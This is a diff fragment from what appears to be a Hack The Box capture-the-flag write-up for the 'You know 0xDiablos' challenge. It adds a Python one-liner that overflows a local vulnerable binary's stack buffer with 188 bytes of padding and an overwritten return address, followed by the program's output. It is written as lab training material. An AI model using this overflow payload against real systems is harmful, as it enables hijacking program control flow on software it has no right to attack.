@@ -92,3 +92,10 @@
 └           0x08049326      c3             ret
 [0x080492b1]> 
 ```
+
+```python
+~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*188 + '\xe2\x91\x04\x08')" | ./vuln     
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+Hurry up and try in on server side.
+```
